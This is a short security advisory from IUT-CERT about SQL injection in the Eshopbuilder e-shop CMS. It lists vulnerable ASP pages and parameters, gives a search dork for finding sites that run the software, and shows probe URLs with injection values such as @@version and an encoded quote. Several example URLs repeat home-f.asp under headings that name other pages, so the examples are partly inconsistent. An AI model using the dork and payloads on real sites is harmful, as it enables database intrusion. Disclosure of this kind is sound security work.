@@ -1,0 +1,83 @@
+================= IUT-CERT =================
+
+Title: Eshopbuilde CMS SQL Injection Vulnerability
+
+Vendor: www.eshopbuilder.ir
+
+Dork: Design by Satcom Co
+Type: Input.Validation.Vulnerability (SQL Injection)
+
+Fix: N/A
+
+================== nsec.ir =================
+
+Description:
+
+------------------
+
+Eshopbuilder is a E-shop CMS written in persian language. The Eshopbuilder product is vulnerable to SQL injection.
+
+
+Vulnerability Variant:
+
+------------------
+Injection "/home-f.asp","/opinions-f.asp" in "sitebid" parameter.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+
+Injection "/more-f.asp" in "sitebid" ,"id","secText","client-ip" and "G_id" parameters.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=\"
+
+other parameters("id","secText","client-ip","G_id") is similar to "sitebid" parameter.
+Injection "/selectintro.asp" in "sitebid" ,"id","ma_id","mi_id","secText","client-ip" and "G_id" parameters.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+
+other parameters("id","ma_id","mi_id","secText","client-ip" and "G_id") is similar to "sitebid" parameter.
+
+Injection "/advcount.asp" in "sitebid","secText","adv_code" and "client-ip" parameters.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+
+other parameters("secText" and "client-ip") is similar to "sitebid" parameter.
+
+Injection "/advview.asp" in "sitebid","secText","Grp_Code","_method" and "client-ip" parameters.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+
+other parameters("secText","client-ip","Grp_Code","_method" and "adv_code") is similar to "sitebid" parameter.
+
+Injection "/dis_new-f.asp" in "sitebid","secText","newsId" and "client-ip" parameters.
+
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=@@version
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=JyI%3D
+http://www.example.com/src=www.example.com/home-f.asp?sitebid=%00
+
+other parameters("secText","newsId" and "client-ip") is similar to "sitebid" parameter.
+
+
+Solution:
+
+------------------
+
+Input validation of Parameter "sitebid","id","secText","client-ip","G_id","ma_id","mi_id","Grp_Code","_method","adv_code" should be corrected.
+
+Credit:
+
+------------------
+
+Isfahan University of Technology - Computer Emergency Response Team
+
+Thanks to : M. Fereidounian, M. R. Faghani, N. Fathi, E. Jafari
